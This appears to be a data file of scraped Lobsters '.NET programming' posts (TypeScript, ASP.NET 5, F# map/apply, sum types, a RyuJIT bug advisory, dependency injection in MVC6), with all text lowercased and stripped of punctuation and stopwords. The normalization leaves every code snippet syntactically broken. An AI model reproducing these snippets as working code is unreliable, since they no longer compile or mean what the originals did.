property function let extend interface created use class interface book title string author string bookinfo string class mybook implement book title moby dick author herman melville bookinfo return thistitle thisauthor var b book new mybook alert bbookinfo interface code identical except container called mybook implement book last line instantiate mybooks class conforms interface created earlier run application result displayed cleaner way source code article found keep calm learn much typescript overwhelming time know felt started learning typescript reading language specification guide hopefully post enough get started right direction without sifting page documentation looking outdated code sample hope sparked interest typescript waiting try
539,Lobsters,dotnet,"C#, F#, .NET programming",It Only Multiplies Three Numbers,http://simontylercousins.net/it-only-multiplies-three-numbers/,multiplies three number,,
540,Lobsters,dotnet,"C#, F#, .NET programming",Developing ASP.NET 5 Web Apps with Visual Studio Code,http://developer.telerik.com/featured/developing-asp-net-5-web-apps-with-visual-studio-code/,developing aspnet web apps visual studio code,visual studio net u hello visual studio code official website setup documentation installing aspnet dnx net execution environment yeoman install creating web app running web application http integrating telerik ui aspnet mvc suite ui aspnet mvc conclusion,visual studio net u way back college taken training asp yes heard right active server page got placed small company small city pumped time stint net started part team building prototype product using net framework specifically web app hence used aspnet framework using visual studio net framework close year ago love visual studio grown year year never ever wildest dream thought developing aspnet web apps outside visual studio net ide something changed last year april build developer conference microsoft announced launch new lightweight crossplatform code editor developing modern web application named visual studio code article take lap around involved creating aspnet based web application using visual studio code hello visual studio code visual studio code free download official website whether linux mac window nt matter download run v code platform setting visual studio code fairly simple get stuck always check setup documentation visual studio code filebased code editor nt bell whistle full visual studio net ide lightweight design however editor ton feature support thing like intellisense code completion peek definition peek function code without navigating code refactoring visual studio code also support variety language tsuch coffeescript f go jade java handlebar powershell python name check language support excites visual studio code ability support runtimes like aspnet nodejs following thing around web development microsoft stack aware aspnet new version aspnet support cross platform development mean develop aspnet application linux mac window environment well run web app linux mac window environment nt need visual studio net ide visual studio code need get going aspnet kind freak installing aspnet dnx net execution environment aspnet built scratch make sure adheres modern web app paradigm apps developed using cloud ready key aspect aspnet flexible modular offer minimal overhead allows u choose want part web app dnx stand dot net execution environment installation guideline aspnet different depending platform yeoman come visual studio net ide background wondering file new aspnet project template visual studio code filebased code editor let open file start editing need external help get aspnet project template going yeoman popular commandline scaffolding tool also provides basic aspnet template start yeoman installed using npm mean need nodejs installed nt node system go ahead install apart yeoman also need supporting tool like aspnet generator grunt task runner bower one command command prompt type following command click enter npm install yo gruntcli generatoraspnet bower next let build web application creating web app let step scaffold new aspnet web app open command prompt navigate location want create new web app enter following command command prompt yo aspnet yeoman display application option aspnet generator option console application web application web application basic membershipauthentication web api application nancy aspnet application class library unit test project select web application basic use arrow key select option press enter fig yeoman aspnet generator next need name web app using helloworld would nt name sample aspnet web app type name press enter yeoman go ahead scaffold application directory app created name gave yeoman change directory web app directory case helloworld cd helloworld via command prompt open visual studio code code visual studio code launch load helloworld project file project displayed explore window fig visual studio code editor within visual studio code editor select view command palette option command palette enter following command dnx dnu restore helloworld restore command installs necessary nuget package required running web application launch command prompt package downloaded everything done receive message saying completed running web application successfully created web application time run take look output visual studio code open command palette selecting view command palette enter following command run application dnx kestrel helloworld microsoftaspnethosting server hostingini note start typing command command palette prompt full command list select command list command executed fig running web app open browser navigate http fig aspnet web application output created aspnet web application outside visual studio net ide seems need start accepting fact aspnet longer window go cross platform term development deployment integrating telerik ui aspnet mvc suite telerik offer ui suite known ui aspnet mvc powered kendo ui hood provide html helper call kendo ui wrapper kendo ui wrapper make easy work kendo ui control speed development step add ui aspnet mvc project open projectjson file dependency add kendo dependency currently kendo mvc binary version available dependency kendomvc next open startupcs locate method named configureservices add following snippet method register ui aspnet mvc helper servicesaddkendo next open viewsviewimportscshtml import namespace kendomvcui using kendomvcui copy kendo ui client side resource need install kendo ui professional package commercial package install via bower running following command bower install http bowertelerikcombowerkendouigit kendo ui professional bower package hosted private git repository would require active telerik account installation asked enter password multiple time bower install kendo ui professional package kendoui wwwrootlib folder next need register kendo ui script style viewssharedlayoutcshtml head link rel stylesheet href libkendouistyleskendocommonbootstrapmincss link rel stylesheet href libkendouistyleskendobootstrapmincss link rel stylesheet href libkendouistyleskendodatavizbootstrapmincss head let use kendo ui widget one view use kendo ui datepicker widget open viewshomeindexcshtml add following snippet body script src libkendouijskendoallminjs script script src libkendouijskendoaspnetmvcminjs script rendersection script required false body run web app using dnx kestrel command used earlier output fig kendo ui date picker widget conclusion complete aspnet web application integrated telerik ui aspnet mvc widget developed using visual studio code supporting tool like yeoman bower hope enjoyed journey next time happy coding
541,Lobsters,dotnet,"C#, F#, .NET programming",Microsoft CoreFoundation arc4random(),https://github.com/Microsoft/WinObjC/blob/59a63e42a9d10da8aadbf8d3b6c10fd02e6b40c6/Frameworks/CoreFoundation/CFMisc.mm#L28,microsoft corefoundation,permalink join github today sign reload reload,permalink dismiss join github today github home million developer working together host review code manage project build software together sign retrieve contributor time line sloc kb copyright c microsoft corporation right reserved code licensed mit license mit software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software import corefoundationcorefoundationh include windowsh ifndef islandwoodcompat include systypesh endif extern c void objcclasscfconstantstring null corefoundationexport extern c return rand rand rand rand corefoundationexport extern c int usleep long sec sleep sec return corefoundationexport extern c int sysctlbyname const char name void sizet outsize const void sizet strcmp name hwmachine const int required outsize buffer return nr byte required response outsize required min outsize required else return strncpy char winobjc outsize outsize required return outsize required enomem return cfstringref cfcopydescription cftyperef ref return cfstringref desc perform action time signed another tab window reload refresh session signed another tab window reload refresh session
542,Lobsters,dotnet,"C#, F#, .NET programming","Automated reasoning in F#, Scala, Haskell, C++, and Julia",https://phdp.github.io/posts/2015-04-05-automated-reasoning.html,automated reasoning f scala haskell c julia,automated reasoning f scala haskell c julia ml family c julia might get return type declaration point conclusion,automated reasoning f scala haskell c julia need simplify following expression e time x time luckily u wo nt remember elementary school arithmetic harris excellent handbook practical logic automated reasoning begin simple algorithm exactly complicated pretty good barometer painful programming language kind hybrid probabilistic logic statistical relational approach work compare implementation harris simple algorithm f scala haskell c julia programming language hurt writing post competition avoided talking language dislike sum type discussed length awesome useful problem many many others ml family harris book us ocaml popular language solver f haskell scala share root ocaml f closest thing ocaml dialect start f sum type expression expression either var string constant integer addition made two expression multiplication also made two expression type expr var string const int add expr expr mul expr expr simplify single component expression function take expression use pattern matching select right approach based type value example add constant x expression return x let e match e add const x add x const mul x const mul const x x mul x const mul const x const add const const b const b mul const const b const b e recursive function simplify entire expression let rec simplify e match e add x add simplify x simplify mul x mul simplify x simplify e return value string expression reduced constant let exprstr e match e const x string x expression could simplified constant operator sends result left right example log sqrt computes log square root result nice allows natural lefttoright flow functional programming entrypoint let main argv add mul add const mul const var x const const simplify exprstr printf f main return success à la c almost ocaml version harris book key trick define expression expr variable string constant integer addition multiplication made two expression important objectoriented programming language focus hierarchy object sum type define type series alternative sum type important another reason provide easy way express thing like function might return integer example haskell want data structure map key value import datamap map import qualified datamap map capital mapfromlist finland helsinki france paris japan tokyo south korea seoul arrakis arrakeen lookupcapitals country case maplookup country capital capital capital country capital nothing country even country point keyvalue store return value key present example map take country string return capital string however try take value map lookup function haskell return maybe type either string string provided found map nothing key absent use pattern matching deal possibility lookupcapitals function one common mistake programming return null deal properly solution sum type return wrapped value handling possibility explicitly pattern matching solves type many language would solve exception trycatch apparatus ghci lookupcapitals arrakis capital arrakis arrakeen ghci lookupcapitals canada canada even country speaking haskell code algorithm data expr var string const int add expr expr mult expr expr expr expr e case e add const x x add x const x add const const b const b mult x const const mult const x const mult x const x mult const x x mult const const b const b e simplify expr expr simplify e case e add x add simplify x simplify mult x mult simplify x simplify e e add mult add const mult const var x const const simplify e main putstrln case const x show x could simplify expression constant quite similar f decided add type explicitly simplify haskell smart enough deduce type without arguably thing worth explaining operator operator force haskell evaluate expression right operator priority reminds parenthesis absolutely right x value x log sqrt exp log sqrt exp operator reduce visual clutter opinion f easier read operator enforces lefttoright reading natural reading code insideout let z exp sqrt log although trivial simulate operator haskell x f f x valid haskell z exp sqrt log something bit different scala also static functional programming language sum type greater integration objectoriented paradigm evident object simplify sealed abstract class expr override def tostring show case class variable name string extends expr case class const value int extends expr case class add left expr right expr extends expr case class mult left expr right expr extends expr def evalone e expr expr e match case add const r r case add l const l case add const const b const b case mult const r const case mult l const const case mult const r r case mult l const l case mult const const b const b case e def eval e expr expr e match case add l r evalone add eval l eval r case mult l r evalone mult eval l eval r case e def show e expr e match case const x print x case print expression could simplified constant def main args array string var e add mult add const mult const variable x const const var eval e print everything object scala thus define function simplify method inside singleton object named function evalone eval since bit odd function named simplify inside simplify object c understand every corner c monstrous standard huge surely many feature must something solve simple problem cleanly well wellknown lacuna c see open efficient type switch c library built implement pattern matching effort directed creator c language said use boost library solution based standard library contrived b boost almost standard nt want rely thirdparty library include iostream include string include boostvarianthpp forward declaration struct add struct mult variant expression using expr boost variant int std string boost recursivewrapper add boost recursivewrapper mult base class binary operation class binaryop expr mleft mright public build binary operation left right expression binaryop expr const left expr const right mleft left mright right return expression left side expression auto left const expr const return mleft return expression right side expression auto right const expr const return mright defines add operator struct add public binaryop add expr const left expr const right binaryop left right defines mult operator struct mult public binaryop mult expr const left expr const right binaryop left right overload simplify creating expression auto operator expr const lh expr const rh expr return add lh rh auto operator expr const lh expr const rh expr return mult lh rh visitor addition struct addvisit public boost staticvisitor expr auto operator int lh int rh const expr return expr lh rh template typename r auto operator int lh r const rh const expr return lh expr rh add expr lh expr rh template typename l auto operator l const lh int rh const expr return rh expr lh add expr lh expr rh template typename l typename r auto operator l const lh r const rh const expr return add expr lh expr rh visitor multiplication struct mulvisit public boost staticvisitor expr auto operator int lh int rh const expr return expr lh rh template typename r auto operator int lh r const rh const expr return lh expr lh expr rh mult expr lh expr rh template typename l auto operator l const lh int rh const expr return rh expr rh expr lh mult expr rh expr lh template typename l typename r auto operator l const lh r const rh const expr return mult expr lh expr rh struct public boost staticvisitor expr auto operator add const const expr return boost applyvisitor addvisit aleft aright auto operator mult const const expr return boost applyvisitor mulvisit mleft mright template typename auto operator const const expr return expr struct simplify public boost staticvisitor expr auto operator add const const expr auto left boost applyvisitor simplify aleft auto right boost applyvisitor simplify aright auto addlr boost applyvisitor addvisit left right return boost applyvisitor addlr auto operator mult const const expr auto left boost applyvisitor simplify mleft auto right boost applyvisitor simplify mright auto mullr boost applyvisitor mulvisit left right return boost applyvisitor mullr template typename auto operator const const expr return expr struct printexpr public boost staticvisitor std string auto operator int n const std string return std tostring n auto operator expr const const std string return expression could simplified constant auto main int const auto e expr expr expr x expr expr const auto boost applyvisitor simplify e std cout boost applyvisitor printexpr std endl return boost variant action biggest qualm type clever headerheavy code get see big chunk developer lifework unroll eye every time small mistake made otherwise ok substitute proper sum typespattern matching want know code work need read bit visitor pattern julia julia attempt build fast flexible replacement rpythonmatlab issue dynamic language elegant way switch type fair really static language either see previous section however julia support multipledispatch based type annotation clear quite different f scalahaskell approach language possible define sum type pattern matching constructor julia define function type annotation let interpreter dispatch based runtime type information multiple dispatch supported julia performance allows interpreter compile optimized function use best one adding predictability keeping language dynamic reason algorithm julia abstract expr type const unlike pattern matching dispatch type need expression operator julia like c could used match macro overkill inelegant first thought good enough way simulate sum type pattern matching matter julia ecosystem feature useful build solver logic theorem proving system etc etc pretty nice technical computing platform unfortunately julia well simple example think oddity language would soon bite u return type declaration allowed yes big deal first question correctness return float thinking returning integer awful also since annotation allowed return value also impossible add annotation higherorder function function taking function input concrete example firstorder logic predicate mapping object boolean function mapping object object like solve pre object bool solve fun object object instead test type return value inside function said julia young might get return type declaration point conclusion sum type pattern matching awesome let world 世界 print hello world
543,Lobsters,dotnet,"C#, F#, .NET programming",Understanding map and apply,http://fsharpforfunandprofit.com/posts/elevated-world/,understanding map apply,talk functional pattern promised kind thing shortage background exactly elevated world series content part lifting elevated world part compose worldcrossing function part using core function practice part mixing list elevated value part realworld example us technique part designing elevated world part summary download ebookpdf part lifting elevated world new one function common name common operator signature description alternative interpretation implementation example usage example property correct map implementation post property based testing functor type class haskell trait scalaz ocaml c variant map const map map work crossworld function later post function common name common operator signature description implementation example function common name common operator signature description alternative interpretation implementation example infix version apply apply v map property correct applyreturn implementation applicative functor family function common name common operator signature description interpreting defining term combining missing bad data without one sided combiners function ziplist world common name common operator signature description interpreting ziplist world type support summary next post map bind apply oh series comment comment powered disqus blog comment powered,part map bind apply oh series series post attempt describe core function dealing generic data type option list followup post talk functional pattern yes know promised kind thing post thought take different approach people rather talking abstraction type class thought might useful focus core function used practice word sort map return apply bind section function describing name common alias common operator type signature detailed description needed used along visuals always find helpful haskellers categorytheorists may want look away mathematics quite lot handwaving going avoid jargon haskellspecific concept type class focus big picture much possible concept applicable kind functional programming language know people might dislike approach fine shortage academic explanation web start finally post site writing benefit well part learning process claim expert made error please let know background start let provide background terminology imagine two world could program everyday world world call reason explain shortly elevated world similar normal world fact every thing normal world corresponding thing elevated world example set value called int normal world elevated world parallel set value called say e int similarly set value called string normal world elevated world parallel set value called e string also function ints string normal world function e int e string elevated world note deliberately using term rather emphasis relationship value world important underlying data type exactly elevated world define elevated world exactly many different kind elevated world anything common represent data structure option represent workflow state represent signal observable asychronous value async concept even though various elevated world nothing common specifically commonality way worked find certain issue occur different elevated world use standard tool pattern deal issue rest series attempt document tool pattern series content series developed follows first discus tool lifting normal thing elevated world includes function map return apply bind next discus combine elevated value different way based whether value independent dependent next look way mixing list elevated value finally look two realworld example put technique use find accidentally inventing reader monad list shortcut various function part lifting elevated world part compose worldcrossing function part using core function practice part mixing list elevated value part realworld example us technique part designing elevated world part summary find site useful download ebookpdf part lifting elevated world first challenge get normal world elevated world first assume particular elevated world every type normal world corresponding type elevated world every value normal world corresponding value elevated world every function normal world corresponding function elevated world concept moving something normal world elevated world called used term first place call corresponding thing elevated world different common implementation lifting give name various pattern map return note standard name lifted type seen called really happy name invented new one also trying avoid assumption want imply lifted type somehow better contain extra information hope using word post focus lifting process rather type using word would inaccurate requirement type part monad map function common name map fmap lift select common operator lift function elevated world signature b e e b alternatively parameter reversed e b e b description generic name something take function normal world transforms corresponding function elevated world elevated world implementation map alternative interpretation alternative interpretation map two parameter function take elevated value e normal function b return new elevated value e b generated applying function b internal element e language function curried default f interpretation language may need curryuncurry switch two us note two parameter version often signature e b e b elevated value first normal function second abstract point view difference map concept obviously parameter order affect might use map function practice implementation example two example map defined option list f map option let mapoption f opt match opt none none x f x type b option b option map list let rec maplist f list match list head tail new head new tail f head maplist f tail type b list b list function builtin course need define done show might look common type usage example example map used f define function normal world let x x type int int function lifted world option let optionmap type int option int option function lifted world list let listmap type int list int list mapped version place write code like many case bother create intermediate function partial application used instead optionmap listmap property correct map implementation said earlier elevated world way mirror normal world every function normal world corresponding function elevated world want map return corresponding elevated function sensible way example map add wrongly return elevated version multiply map lowercase return elevated version uppercase sure particular implementation map indeed return correct corresponding function post property based testing showed correct implementation function defined tested using general property rather specific example true map well implementation vary specific elevated world case certain property implementation satisfy avoid strange behavior first take id function normal world lift elevated world map new function must id function elevated world next take two function f g normal world compose h say lift resulting function using map resulting function lifted f g elevated world first composed afterwards two property socalled functor programming sense defined generic data type e case plus map function obeys functor law note confusing word category theory sense programming sense defined also thing called defined library functor type class haskell functor trait scalaz mention functors sml ocaml c different yet consequently prefer talk world practical programming almost never run elevated world support mapped somehow variant map variant map common const map const map replaces value constant rather output function case specialized function like allow efficient implementation map work crossworld function map function b life entirely normal world function want map return something normal world value another different enhanced world see address challenge later post return function common name return pure unit yield point common operator none lift single value elevated world signature e description also known simply creates elevated value normal value function go many name going consistent call return common term f term used computation expression note ignoring difference pure return type class focus post implementation example two example return implementation f value lifted world option let returnoption x x type option value lifted world list let returnlist x x type list obviously need define special function like option list done show return might look common type apply function common name apply ap common operator unpacks function wrapped inside elevated value lifted function e e b signature e b e e b description unpacks function wrapped inside elevated value e b lifted function e e b might seem unimportant actually valuable allows lift multiparameter function normal world multiparameter function elevated world see shortly alternative interpretation alternative interpretation apply two parameter function take elevated value e elevated function e b return new elevated value e b generated applying function b internal element e example oneparameter function e b apply single elevated parameter get output another elevated value twoparameter function e b c use apply twice succession two elevated parameter get elevated output continue use technique work many parameter wish implementation example example defining apply two different type f module option apply function option let apply fopt xopt match fopt xopt f x f x none module list apply function list f g apply x becomes f x f g x g let apply flist b list xlist list f flist x xlist yield f x case rather name like applyoption applylist given function name put pertype module note listapply implementation function first list applied value second list resulting style result list function f g applied list value x becomes fourelement list f x f g x g see shortly way also course cheating building implementation loop functionality already exists clarity showing apply work easy enough create recursive implementation though easy create one properly tailrecursive want focus concept implementation infix version apply using apply function stand awkward common create infix version typically called place write code like let resultoption let optionapply add resultoption let resultlist let listapply add resultlist apply v map combination apply return considered map apply return construct map vice versa work construct lifted function normal function use return normal function apply give result simply done map first place trick also mean infix notation simplified little initial return apply replaced map typically create infix operator map well f let let optionmap let optionapply add let let listmap let listapply add make code look like using function normally instead normal add x use similar looking add x x elevated value rather normal value people even called style one fun let batman let listmap let listapply string concatenation using bam kapow zap result bam bam kapow kapow zap zap property correct applyreturn implementation map correct implementation applyreturn pair property true matter elevated world working four socalled applicative functor programming sense defined generic data type constructor e plus pair function apply return obey applicative law law map law quite sensible show two first law say take id function normal world lift elevated world return apply new function type e e id function elevated world second law say take function f value x normal world apply f x get result say lift result using return resulting value lifted f x elevated world first applied afterwards two law easily diagrammed document together law ensure implementation sensible liftn family function common name similar common operator none combine two three four elevated value using specified function signature b c e e b e c b c e e b e c e etc description apply return function used define series helper function liftn etc take normal function n parameter etc transform corresponding elevated function note map usually defined separate function implementation might look like module option let apply let optionmap let f x f x let f x z f x z let f x z w f x z w visual representation lift series function used make code bit readable using one premade lift function avoid syntax first example lifting twoparameter function define twoparameter function test let addpair x x lift twoparam function let addpairopt addpair call normal addpairopt result example lifting threeparameter function define threeparameter function test let addtriple x z x z lift threeparam function let addtripleopt addtriple call normal addtripleopt result interpreting alternative interpretation apply elevated value rather function application example using first parameter parameter specifying combine value example value combined two different way first addition multiplication going eliminate need first function parameter generic way combining value yes use tuple constructor combine value combining value without making decision used yet look like diagram might implement option list define tuple creation function let tuple x x create generic combiner option tuple constructor baked let combineopt x tuple x create generic combiner list tuple constructor baked let combinelist x tuple x see happens use combiners combineopt result combinelist result elevated tuple work pair way want need use map actual combining want add value use map function combineopt optionmap fun x x result combinelist listmap fun x x result want multiply value use map function combineopt optionmap fun x x result combinelist listmap fun x x result obviously realworld us would somewhat interesting defining apply term interestingly function actually used alternative basis defining apply define apply term function setting combining function function application demonstration work option module option define scratch let f xopt yopt match xopt yopt x f x none define apply term let apply fopt xopt fun f x f x fopt xopt alternative approach worth knowing type easier define apply combining missing bad data notice combiners looked one elevated value somehow overall result also bad example combinelist one parameter empty list result also empty list combineopt one parameter none result also none combineopt none optionmap fun x x result none combinelist listmap fun x x result empty list possible create alternative kind combiner ignores missing bad value adding number ignored information see post without one sided combiners case might two elevated value want discard value one side example list let x fun left right left x let x fun left right right x combine list list get list expected content come one side turn feature replicate value n time crossing n let repeat n pattern n pattern let replicate n x n x repeat b b b b replicate course mean efficient way replicate value show starting two function apply return build quite complex behavior practical note though might away useful well many case might want value want effect example parser might see code like let readquotedstring readquotechar readnonquotechars readquotechar snippet readquotechar mean read quote character input readnonquotechars mean series nonquote character input parsing quoted string want ensure input stream contains quote character read care quote character inner content hence use ignore leading quote ignore trailing quote zip function ziplist world common name zip zipwith common operator context ziplist world combine two list enumerables using specified function signature e b c e e b e c e list enumerable type e e b e b tuplecombined version description data type might one valid implementation apply example another possible implementation apply list commonly called ziplist variant implementation corresponding element list processed time list shifted get next element list function f g applied list value x becomes twoelement list f x g alternate zip implementation f g apply x becomes f x g let rec ziplist flist xlist match flist xlist either side empty done f ftail x xtail new head new tail f x ziplist ftail xtail type b list b list warning implementation demonstration tailrecursive use large list list different length implementation throw exception f library function listzip others silently ignore extra data implementation ok see use let x x let x x let x x let result let ziplist result note result three element used standard listapply would nine element interpreting saw listapply rather could interpreted combiner similarly ziplist let add x x let resultadd let ziplist add add resultadd add add note one add function first list one add every element second third list could get annoying often version zip used whereby specify combining function get back list tuples instead process later using map approach used combine function discussed ziplist ziplist world standard list world apply return different version apply create different version list world called ziplist world ziplist world quite different standard list world ziplist world apply function implemented interestingly ziplist world completely different implementation return compared standard list world standard list world return list single element ziplist world infinitely repeated value nonlazy language like f replace list seq aka ienumerable create infinitely repeated value shown module zipseq define return zipseqworld let retn x seqinitinfinite fun x define apply zipseqworld define apply term aka let apply fseq xseq fun f x f x fseq xseq type b seq seq b seq define sequence combination two others let triangularnumbers let apply let addanddividebytwo x x let number seqinitinfinite id let squarenumbers seqinitinfinite fun retn addanddividebytwo number squarenumbers evaluate first element display result triangularnumbers seqtake listofseq printfn result example demonstrates elevated world data type like list type consists datatype function work particular case share data type quite different environment type support map apply return far defined useful function abstract way easy find real type implementation including various law answer easy fact almost type support set function hardpressed find useful type mean map apply return available easily implemented standard type option list seq async etc also type likely define summary post described three core function lifting simple value elevated world map return apply plus derived function like liftn zip practice however thing simple frequently work function cross world input normal world output elevated world next post show worldcrossing function lifted elevated world well map bind apply oh series understanding map apply comment please enable javascript view comment powered disqus blog comment powered
544,Lobsters,dotnet,"C#, F#, .NET programming","a Lobsters to Gopher proxy, for people who can't give up port 70",https://github.com/NattyNarwhal/LobsterGopher,lobster gopher proxy people ca nt give port,join github today sign file permalink reload reload,read lobster gopher gateway dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time read lobster gopher gateway perform action time signed another tab window reload refresh session signed another tab window reload refresh session
545,Lobsters,dotnet,"C#, F#, .NET programming",Why you should wait on upgrading to .Net 4.6,http://nickcraver.com/blog/2015/07/27/why-you-should-wait-on-dotnet-46/,wait upgrading net,update august microsoft security bulletin coreclr coreclr visualfsharp original post marc gravell upgrading stack overflow net issue opened github public awareness fix released see update update july pull request posted matt michell microsoft update july including small console app update july ryujit bug advisory net framework update july another subtle bug confirmed separate issue increasing bug count update august method call get different parameter value passed already excellent write david broman uploaded minimal version reproduction github miniprofiler redis optimization enabled unaltered code github github repo method called get parameter passed production recommendation temporary fix removed update released method work,update august patch bug released microsoft update advisory released updated version ryujit today resolve advisory update released microsoft security bulletin available window update via direct download update resolve coreclr coreclr visualfsharp major thanks developer reported issue thanks everyone patience original post follows work several people marc gravell taken lead stack overflow continue coordinate microsoft resolution fixed bug internally user given severity good conscience let subtle yet highimpact bug linger silently upgrading stack overflow net upgrade yet either find issue opened github public awareness fix released see update update july pull request posted matt michell microsoft update july several smaller repros including small console app microsoft confirmed working expedited hotfix release detail yet update july microsoft rich lander posted update ryujit bug advisory net framework update july another subtle bug found andrey akinshin f engine exception confirmed separate issue still recommend disabling ryujit production given increasing bug count update august patch bug released microsoft see critical bug specific net ryujit make big bold get point quickly method call get different parameter value passed jit justintime compiler net many platform something called tail call optimization happens alleviate stack load lastcalled method chain go tail call already excellent write david broman issue bug ryujit implement optimization certain situation let look specific example hit stack overflow uploaded minimal version reproduction github noticed miniprofiler use track performance showing first page load profiler failed show application recycle turned caching bug based http cache usage locally http cache cache stack overflow redis typically day debugging sanity checking tracked crazy void set string key val int durationsecs bool sliding bool broadcastremovefromcache false setwithpriority key val durationsecs sliding cacheitemprioritydefault void setwithpriority string key val int durationsecs bool issliding cacheitempriority priority key keyincontext key rawset key val durationsecs issliding priority void rawset string cachekey object val int durationsecs bool issliding cacheitempriority priority var absolute issliding durationsecshasvalue datetimeutcnowaddseconds durationsecsvalue cachenoabsoluteexpiration var sliding issliding durationsecshasvalue timespanfromseconds durationsecsvalue cachenoslidingexpiration httpruntimecacheinsert cachekey val null absolute sliding priority null happening setting miniprofiler cache duration passed set second often time seeing immediately expire http cache next narrowed bug optimization enabled optimize code checkbox project build property point sanity window debug everything code look like note slightly shortened fit page unaltered code github void set string key val int durationsecs bool sliding bool broadcastremovefromcache false localcacheonlogduration key durationsecs localcacheset setwithpriority key val durationsecs sliding cacheitemprioritydefault void setwithpriority string key val int durationsecs bool issliding cacheitempriority priority localcacheonlogduration key durationsecs localcachesetwithpriority key keyincontext key rawset key val durationsecs issliding priority void rawset string cachekey object value int durationsecs bool issliding cacheitempriority priority localcacheonlogduration cachekey durationsecs rawset var absolute issliding durationsecshasvalue datetimeutcnowaddseconds durationsecsvalue cachenoabsoluteexpiration var sliding issliding durationsecshasvalue timespanfromseconds durationsecsvalue cachenoslidingexpiration httpruntimecacheinsert cachekey value null absolute sliding priority removed var evt added evt null evt cachekey value absolute sliding priority durationsecs issliding nothing fancy method calling scary result localcacheonlogduration call localcacheset localcachesetwithpriority rawset null seemingly random value example test run github repo method called get parameter passed net result local cache use heavily either unreliable nonexistent would add tremendous amount load entire infrastructure making stack overflow much slower likely leading full outage telling though let step back look big picture variable name could use amounttowithdraw qtyofstocktobuy carboncopytoaccountid voltage targetaltitude rotorvelocity oxygenpressure dosagemilliliters help put thing perspective bug obvious several reason happens optimization enabled developer project debug show locally mean see release people production attaching debugger alters behavior almost always hide issue adding debugwriteline often fix issue tail change reproduce certain scenario eg repro console application v hosting ii given nature bug far tell equally affect framework library well happen nuget library release issue may code address obvious question security issue answer something could actively exploit almost case since stack variable thing swapped around however issue indirectly example code make assumption null param like user null user systemuser null passed certainly problem giving user access sporadically common example would value role enum passed incorrectly recommendation install net production installed net disable ryujit immediately temporary fix removed update released disable ryujit via registry setting note requires application pool recycle take effect hkeylocalmachinesoftwaremicrosoftnetframework add uselegacyjit dword value via powershell setitemproperty path hklm softwaremicrosoftnetframework name uselegacyjit type dword value aware webconfig method disabling ryujit work outside ii hosting applying fix via appconfig work talking pushing microsoft get fix shipped asap recognize releasing fix net microsoft side small deal disclosure prompted reality fix released distributed applied immediately
548,Lobsters,dotnet,"C#, F#, .NET programming",Dependency Injection in ASP.NET MVC6,http://developer.telerik.com/featured/dependency-injection-in-asp-net-mvc6/,dependency injection aspnet,new instance transient singleton scoped basic setup unable resolve service getservice iserviceprovider weakness replacing default di container discoverable autofac wrap resource framework example,dependency injection di possible previous version mvc new version di easier implement di supplied right box article look new di implementation work weakness replace favorite di framework new unification apis across aspnet common theme throughout aspnet dependency injection different new aspnet stack including mvc signalr web api etc rely builtin minimalistic di container core feature di container abstracted iserviceprovider interface available throughout stack iserviceprovider across component aspnet framework single dependency resolved part application di container support mode operation instance specific instance given time responsible initial creation transient new instance created every time singleton single instance created act like singleton scoped single instance created inside current scope equivalent singleton current scope basic setup let walk setting di mvc application demonstrate basic resolve dependency service used get project data nt need know anything service implement iprojectservice interface interface custom demo project iprojectservice one method getorganization method retrieves organization corresponding list project public interface iprojectservice string name get organization getorganization public class organization public string name get set jsonproperty avatarurl public string avatarurl get set public iqueryable project project get set use iprojectservice get organization data display view let start setting controller service used use constructor injection creating new constructor method controller accepts iprojectservice next index action call getorganization sending data view rendered private readonly iprojectservice projectservice public homecontroller iprojectservice projectservice thisprojectservice projectservice public iactionresult index organization org projectservicegetorganization return view org try run application point receive exception nt yet added concrete implementation iprojectservice di container invalidoperationexception unable resolve service type service iprojectservice attempting activate controller homecontroller microsoft framework dependencyinjection activatorutilitiesgetservice iserviceprovider sp type type type requiredby boolean isdefaultparameterrequired exception message show code fails call activatorutilitiesgetservice valuable information show di container already involved controller construction need tell container resolve dependency order resolve dependency need concrete implementation iprojectservice add demoservice class simplicity use static dummy data public class demoservice iprojectservice public string name get demo public organization getorganization new organization name thisname avatarurl http text thisname project getprojects private iqueryable project getprojects new list project new project id description test project name test star new project id description test project name test star asqueryable finally instruct di container instantiate new demoservice whenever iprojectservice required configure container modify configureservices method startupcs configuration added end method method get called runtime use method add service container public void configureservices iservicecollection service service add mvc service service container servicesaddmvc service service added using addtransient extension method service collection setting iprojectservice type service demoservice implementation public void configureservices iservicecollection service service add mvc service service container servicesaddmvc service servicesaddtransient iprojectservice demoservice service added demoservice instantiated controller created exception longer thrown weakness baked di layer throughout aspnet stack helpful temper expectation useful simple scenario limited default container support constructor injection resolve type one one public constructor need worry though complete control di container easy replace favorite di solution replacing default di container setting replacement di container require lot code process could discoverable continue previous example show exactly extensibility point method using configureservices actually one two delegate application use register di container service first default delegate action iservicecollection used previous example resolve demoservice second func iservicecollection iserviceprovider used replace default container returning custom implementation iserviceprovider change default allow alternative iserviceprovider used need change method signature test easily modifying example change method returning void iserviceprovider end method return servicesbuildserviceprovider point method exactly thing still using default di container public iserviceprovider configureservices iservicecollection service service add mvc service service container servicesaddmvc service servicesaddtransient iprojectservice demoservice return servicesbuildserviceprovider application still build run except exposed extensibility point need next need add third party di container variety di container choose strength weakness example using autofac time writing autofac dnx compatible alpha version use install autofac open packagejson file add autofac alpha binary dependency autofac autofacdnx startupcs modify configureservices method time add dependency autofac resolve container back iserviceprovider replacing default container public iserviceprovider configureservices iservicecollection service service add mvc service service container servicesaddmvc autofac config var builder new containerbuilder builderregistertype demoservice iprojectservice instanceperlifetimescope populate container service previously registered builderpopulate service var container builderbuild return containerresolve iserviceprovider application using autofac container place default container fully take advantage autofac feature aspnet developed iserviceprovider wont need change code project let make one final change example swapping demoservice another implementation us github rest api populate project list githubservice implement iprojectservice demoservice however take name parameter constructor using autofac set name value constructor configuration public iserviceprovider configureservices iservicecollection service builderregister svc new githubservice telerik iprojectservice instanceperlifetimescope builderregistertype demoservice iprojectservice instanceperlifetimescope restarting application reveals new githubservice successfully resolved without touching controller code wrap resource new aspnet provides outofthebox di throughout stack new di container basic enough get job done lack robust configuration container easy enough replace know look allowing use fullyfeatured third party tool source code framework example project found github
